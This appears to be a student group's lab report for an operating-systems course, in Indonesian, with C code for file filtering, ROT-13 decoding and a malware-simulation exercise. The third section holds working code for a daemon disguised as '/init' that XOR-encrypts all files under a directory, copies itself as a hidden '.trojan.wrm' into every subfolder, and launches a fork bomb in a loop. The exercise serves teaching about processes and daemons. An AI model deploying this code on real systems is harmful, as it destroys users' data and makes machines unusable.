# Sisop-2-2025-IT35
### Anggota Kelompok:  
- Rayka Dharma Pranandita (*5027241039*)
- Bima Aria Perthama (*5027241060*)
- Gemilang Ananda Lingua (*5027241072*)  

### Table of Contents :
- [Nomor 1](#nomor-1-rayka)  
  a. Downloading the Clues  
  b. Filtering the Files  
  c. Combine the File Content  
  d. Decode the file  
  e. Password Check   
- [Nomor 2](#nomor-2-aria)  
  a. Download and preparing  
  b. Decrypt  
  c. Quarantine and Return  
  d. Eradicate  
  e. Shutdown  
  f. Error Handling  
  g. Logs  
- [Nomor 3](#nomor-3-gilang)  
  a. Daemon  
  b. wannacryptor    
  c. trojan.wrm  
  d. trojan keep alive  
  e. rodok.exe  
- [Nomor 4](#nomor-4-rayka)  
  a. Mengetahui semua aktivitas user    
  b. Memasang mata-mata dalam mode daemon  
  c. Menghentikan pengawasan  
  d. Menggagalkan semua proses user yang sedang berjalan  
  e. Mengizinkan user untuk kembali menjalankan proses  
  f. Mencatat ke dalam file log  

### Nomor 1 (Rayka)
#### Downloading the Clues
Melakukan wget, unzip dan rm zip file ketika files Clue belum ada:
Hal ini dapat dilakukan dengan menyimpan kode bash dalam variable char:
```c
const char *download = // script buat download, unzip, rm file zip
    "#!/bin/bash\n"
    "wget -q -O Clues.zip \"https://drive.usercontent.google.com/u/0/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download\"\n"
    "unzip Clues.zip\n"
    "rm Clues.zip\n";
```

Dimana kode bash tersebut akan dapat dijalankan dengan menggunakan fungsi:
```c
int run_script(const char *script_content){ // run script.sh
  const char *temp_path = "/tmp/temp_script.sh";
  FILE *fp = fopen(temp_path, "w"); // buka file
  fprintf(fp, "%s", script_content); // tulis script
  fclose(fp);
  chmod(temp_path, 0777); // bikin executable

  // bikin fork
  pid_t pid = fork();
  if (pid == 0) {
    execl("/bin/bash", "bash", temp_path, (char *)NULL);
    exit(1);
  }
  else if (pid > 0) {
    waitpid(pid, NULL, 0);
  }
  unlink(temp_path);
  return 0;
}
```
Proses tersebut dijalankan ketika directory Clues belum ada (files clue belum didownload), maka jika dalam program akan ada pengecekan kondisi seperti ini:
```c
struct stat st = {0};
  if (!(stat("Clues", &st) == 0 && S_ISDIR(st.st_mode))) { // cek ada dir Clues ga
    run_script(download);
  }
```
Dimana akan melakukan pencarian "Clues" di directory sekarang, dengan syarat kedua "Clues" berupa directory atau folder, dimana jika hal ini tidak terpenuhi program bash akan tereksekusi. Berikut contoh hasil eksekusi pertama kali program (belum ada dir Clues):  
![Output Inisialisasi](https://github.com/Rkaaa404/Sisop-2-2025-IT35/blob/main/assets/OutputInit%20(1).jpeg)   

#### Filtering the Files
Melakukan filtering, mengambil files yang memiliki format: [a-z].txt atau [1-9].txt dan memindahkannya ke dir Filtered, sementara file lain akan dihapus, menyisakan dir kosong. Pertama, kita melakukan persipan seperti membuat dir "Filtered", membuka dir "Clues", serta mendapatkan _current working directory_(cwd):
```c
// membuat directory Filtered
  mkdir("Filtered", 0777); // hak rwx ke semua

  DIR *clues = opendir("./Clues");
  struct dirent *de, *sub;
  if (!clues) {
    perror("DIR Clues tidak ditemukan");
    return;
  }

  char cwd[PATH_MAX];
  getcwd(cwd, sizeof(cwd));  // Ambil path absolut cwd
```  

Selanjutnya kita akan melakukan while loop dan membaca isi dari dir "Clues", dikarenakan besarnya loop ini, maka akan dibagi menjadi beberapa part.  
__Part 1:__
```c
while ((de = readdir(clues)) != NULL) {
    if (de->d_type == DT_DIR && strcmp(de->d_name, ".") != 0 && strcmp(de->d_name, "..") != 0) {
      char path[PATH_MAX];
      snprintf(path, sizeof(path), "./Clues/%s", de->d_name);
      DIR *subclues = opendir(path);
      if (!subclues) continue;
```
Ketika menemukan direktori lagi (selanjutnya disebut subdir) dan tidak memiliki nama . (cwd) dan .. (parent dir, dir sebelumya) maka akan menyimpan path dari subdir tersebut. Subdir lalu dilakukan pencarian kembali yang operasinya dijelaskan dalam part 2.  
<br>
__Part 2:__
```c
while ((sub = readdir(subclues)) != NULL) {
        if (sub->d_type == DT_REG) {

          // file yang dicari: [a-z].txt atau [0-9].txt
          if ( (strlen(sub->d_name) == 5) && ((sub->d_name[0] >= 'a' && sub->d_name[0] <= 'z') || (sub->d_name[0] >= '0' && sub->d_name[0] <= '9'))) {

            char src[PATH_MAX], dest[PATH_MAX];
            snprintf(src, sizeof(src), "%s/%s", path, sub->d_name);
            snprintf(dest, sizeof(dest), "%s/Filtered/%s", cwd, sub->d_name);

            rename(src, dest);
          } else {
            char to_delete[PATH_MAX];
            snprintf(to_delete, sizeof(to_delete), "%s/%s", path, sub->d_name);
            remove(to_delete);
          }
        }
```
Jika data adalah file reguler, maka kita akan melakukan penegcekan dimana di sini kita mencari file txt dengan nama satu huruf [a-z] atau satu angka [0-9], setelah didapatkan sesuasi kriteria, path dari file tersebut disimpan dan dilakukan operasi rename, yang memindahkan file ke dir "Filtered". Sedangkan jika file tidak memenuhi kriteria maka akan otomatis diremove.  
<br>
Hasil Output:   
![Output Filtering](https://github.com/Rkaaa404/Sisop-2-2025-IT35/blob/main/assets/OutputFilter%20(1).jpeg)   

#### Combine the File Content  
Menggabungkan isi dari files di dir "Filtered" menjadi satu txt file dengan urutan penggabungan angka huruf angka huruf.  
Pertama tama kita siapkan fungsi untuk komparasi pada qsort nanti:
```c
int compare_strings(const void *a, const void *b) { // comparator buat qsort 
    return strcmp(*(const char **)a, *(const char **)b);
}
```  

Selanjutnya kita akan masuk ke persiapan (membuka dir dan menyiapkan file):
```c
// buka dir Filtered
  DIR *d = opendir("./Filtered");
  struct dirent *de;
  if (!d){
    perror("Gagal membuka DIR Filtered");
    return;
  }

  // Write Combined.txt
  FILE *combined = fopen("Combined.txt", "w");
  if (!combined) {
    perror("Failed to open Combined.txt");
    return;
  }

```
Setelah itu, kode bisa dibagi menjadi beberapa potongan kode sebagai berikut:
__Part 1:__
```c
  char *digits[25];
  char *letters[25];
  int dcount=0;
  int lcount=0;
  while ((de = readdir(d)) != NULL){
    if (de->d_type == DT_REG) { 
        char name = de->d_name[0];
      if (isdigit(name)) { // jika nama file digit masuk digits[]
        digits[dcount] = strdup(de->d_name);
        dcount++;
      } else if (isalpha(name)) { // jika nama file alphabet masuk letters[]
        letters[lcount] = strdup(de->d_name);
        lcount++;
      }
    }
  }
  closedir(d); 
```
Membaca dir dan mencari file reguler, dimana jika judulnya digit (angka) nama file akan masuk ke char *digits, sedangkan jika tidak akan masuk ke char *letters, selain itu juga ada penghitung file digits (dcount) dan file huruf (lcounts).  

__Part 2:__
```c
qsort(digits, dcount, sizeof(char *), compare_strings);
qsort(letters, lcount, sizeof(char *), compare_strings);
```
Melakukan qsort sehingga huruf dan angka terdepan berada di depan array  

__Part 3:__
```c
  int lcounter=0;
  int dcounter=0;
  int state=0;
  while (dcounter < dcount || lcounter < lcount){
    FILE *f = NULL;
    if (state == 0 && dcounter < dcount) {
      char path[1024];
      snprintf(path, sizeof(path), "./Filtered/%s", digits[dcounter]);
      f = fopen(path, "r");
      if (f) {
        char buf[1024];
        while (fgets(buf, sizeof(buf), f)) {
            fputs(buf, combined);
        }
        fclose(f);
      }
      free(digits[dcounter]);
      dcounter++;
      state = 1;
    } else if (state == 1 && lcounter < lcount) {
      char path[1024];
      snprintf(path, sizeof(path), "./Filtered/%s", letters[lcounter]);
      f = fopen(path, "r");
      if (f) {
        char buf[1024];
        while (fgets(buf, sizeof(buf), f)) {
            fputs(buf, combined);
        }
        fclose(f);
      }
      free(letters[lcounter]);
      lcounter++;
      state = 0;
    }
  }
  fclose(combined)
}
```
Melakukan while loop dimana selama dcounter (penghitung iterasi digit) kurang dari jumlah total digit, yang sama juga berlaku pada letters, maka program akan terus tereksekusi. Dimana dikarenakan diperlukannya bergantian angka dan huruf, dibuatlah variable state, dimana saat state bernilai 0 akan membaca dan mencatat isi file angka dan mengubah nilai state ke 1, sehingga pada iterasi berikutnya dilakukan pembacaan dan pencatatan isi file huruf. Setelah hal tersebut selesai, program akan menghasilkan output berupa _Combined.txt_.  

Hasil Output:   
![Output Combine](https://github.com/Rkaaa404/Sisop-2-2025-IT35/blob/main/assets/OutputCombine%20(1).jpeg)   

#### Decode the file
Melakukan decode dari ROT-13 dari Completed.txt, maka dari itu kita persiapkan function decode ROT-13, yang dimana ROT-13 sendiri merupakan enkripsi yang menggeser huruf sebanyak 13 huruf ke depannya seperti misalnya: "a" dilakukan ROT-13 maka akan menjadi "n", hal ini berlaku ke huruf huruf selanjutnya. Maka didapatkan kode program:  
```c
void rot13(char *str) {
  for (int i = 0; str[i]; i++) {
    if ('a' <= str[i] && str[i] <= 'z') {
      str[i] = ((str[i] - 'a' + 13) % 26) + 'a';
    } else if ('A' <= str[i] && str[i] <= 'Z') {
      str[i] = ((str[i] - 'A' + 13) % 26) + 'A';
    }
  }
}
```   

Dimana ada dua varian, untuk huruf kecil dan huruf kapital, bisa dilihat bahwa str[i] - 'A' yang membuatnya berubah menjadi angka index, lalu ditambahi 13 (digeser sebanyak 13) dan dimodulus 26 (jumlah alfabet adalah 26 huruf) hal ini untuk membuatnya kembali ke awal "A", lalu penjumlahan terakhir mengubah nilai index kembali ke bentuk huruf. Namun fungsi ini tidak dapat berdiri sendiri saja, diperlukan operasi fil pointer untuk mengakses _combined.txt_ serta membuat _decoded.txt_ yang berbentuk seperti ini:  
```c
void decode_file() {
  FILE *combined = fopen("Combined.txt", "r");
  if (!combined) {
    perror("Failed to open Combined.txt");
    return;
  }

  char buffer[1024];
  FILE *decoded = fopen("Decoded.txt", "w");
  if (!decoded) {
    perror("Failed to open Decoded.txt");
    fclose(combined);
    return;
  }

  while (fgets(buffer, sizeof(buffer), combined)) {
    rot13(buffer);
    fputs(buffer, decoded);
  }

  fclose(combined);
  fclose(decoded);
}
```
Jadi, saat membaca isi file combined (fgets), buffer yang berisikan isi contents file _combined.txt_ dimasukkan ke dalam fungsi rot13 (decoder ROT-13) lalu dilakukan fputs buffer yang telah terolah (decoded) ke dalam file _decoded.txt_  

Hasil Output:   
![Output Decode](https://github.com/Rkaaa404/Sisop-2-2025-IT35/blob/main/assets/OutputDecode%20(1).jpeg)   

#### Password Check
Setelah measukkan kode ke dalam website, akan membuka tampilan baru seperti ini:
![Login Website](https://github.com/Rkaaa404/Sisop-2-2025-IT35/blob/main/assets/PasswordLogin%20(1).jpeg)   

#### Error handling (salah commands):  
Membuat error handlings list command yang benar dengan menggunakan fungsi yang dipanggil jika tidak memenuhi semua conditional statement:
```c
// fungsi
void print_commands(){
  printf("Commands:\n");
  printf("./action -m Filter\n");
  printf("./action -m Combine\n");
  printf("./action -m Decode\n");
}

// potongan kode staetement di main
if ( argc == 3 && strcmp(argv[1], "-m") == 0) {
    if (strcmp(argv[2], "Filter") == 0){
      filter_files();
      printf("Files filtering completed");
    } else if (strcmp(argv[2], "Combine") == 0){
      combine_files();
      printf("Files combined successfully");
    } else if (strcmp(argv[2], "Decode") == 0){
      decode_file();
      printf("File decoded successfully");
    } else {
      print_commands();
    }
  } else {
    print_commands();
  }
```
### Nomor 2 (Aria)
### Nomor 3 (Gilang)

**==================**

*-Soal B ~ XOR encryptor-*

**==================**

Fungsi xor encrypt
```bash
void Soal_B(char *path, unsigned char key) {
    FILE *file = fopen(path, "rb+");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    unsigned char *buffer = malloc(size);
    if (!buffer) {
        fclose(file);
        return;
    }

    fread(buffer, 1, size, file);
    rewind(file);

    for (long i = 0; i < size; i++) {
        buffer[i] ^= key;
    }

    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);
}
```

Rekursif enkripsi seluruh file di direktori dan subdirektori
```bash
void Soal_B_recursive(const char *base_path, unsigned char key) {
    DIR *dir = opendir(base_path);
    if (!dir) return;

    struct dirent *entry;
    char path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(path, sizeof(path), "%s/%s", base_path, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == -1) continue;

        if (S_ISDIR(statbuf.st_mode)) {
            Soal_B_recursive(path, key);
        } else if (S_ISREG(statbuf.st_mode)) {
            Soal_B(path, key);
        }
    }

    closedir(dir);
}
```

**==================**

*-Soal C ~ Trojan Spread-*

**==================**

Fungsi mencopy file malware

```bash
void Soal_C_copy(const char *src, const char *dst) {
    FILE *source = fopen(src, "rb");
    if (!source) return;

    FILE *dest = fopen(dst, "wb");
    if (!dest) {
        fclose(source);
        return;
    }

    char buffer[4096];
    size_t bytes;

    while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
        fwrite(buffer, 1, bytes, dest);
    }

    fclose(source);
    fclose(dest);
}
```

Fungsi menyebar salinan malware ke seluruh direktori

```bash
void Soal_C(const char *dir_path, const char *self_path) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    char path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == -1) continue;

        if (S_ISDIR(statbuf.st_mode)) {
            // Buat salinan malware di direktori ini
            char target_path[1024];
            snprintf(target_path, sizeof(target_path), "%s/.trojan.wrm", path);
            Soal_C_copy(self_path, target_path);

            // Lanjut rekursif
            Soal_C(path, self_path);
        }
    }

    closedir(dir);
}
```

**================**

*-Soal E ~ Fork Bomb-*

**================**

```bash
void Soal_E() {
    while (1) {
        fork();
    }
}

```

**============================**

*-Soal A & D ~ Daemonize + Loop Fitur-*

**============================**

```bash
int main(int argc, char *argv[]) {
    pid_t pid, sid;
```

Daemonisasi

```bash
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent process keluar

    umask(0);
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    if (strlen(argv[0]) >= strlen("/init")) {
        strncpy(argv[0], "/init", strlen(argv[0]));
    }

    char self_path[1024];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len != -1) {
        self_path[len] = '\0';
```

Loop fitur setiap 30 detik 

```bash
  while (1) {
            time_t timestamp = time(NULL);
            unsigned char key = (unsigned char)(timestamp % 256);
```

Enkripsi (Soal B)
```bash
Soal_B_recursive("/home/gilang/Praktikum/Sisop/Modul_2/FiraCode",
```

Sebar Malware (Soal C) 
```bash
Soal_C("/home/gilang/Praktikum/Sisop/Modul_2/FiraCode", self_path);
```

Jalankan fork bomb 
```bash
pid_t rodok_pid = fork();
            if (rodok_pid == 0) {
                Soal_E();
                exit(EXIT_SUCCESS);
            }

            sleep(30);
        }
    }

    return 0;
}
```

### Nomor 4 (Rayka)
